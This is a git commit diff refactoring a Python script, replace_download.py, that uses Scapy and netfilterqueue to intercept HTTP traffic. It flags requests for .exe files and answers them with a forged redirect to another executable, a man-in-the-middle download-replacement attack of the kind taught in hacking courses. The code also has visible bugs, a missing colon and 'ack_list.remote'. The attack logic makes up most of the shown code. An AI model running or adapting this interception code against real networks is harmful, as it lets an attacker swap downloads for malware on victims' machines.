3cc4e9da0ae090637bd1812c29a7e4374b59aca4
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-08-30 15:54:11 -0400

    Cleaned up the code a little

--- replace_download.py
+++ replace_download.py
@@ -4,6 +4,13 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_load(packet, load)
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -11,16 +18,12 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remote(scapy_packet[scapy.TCP].seq)
                 print('[+] Replacing file')
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
+                packet.set_payload(str(modified_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
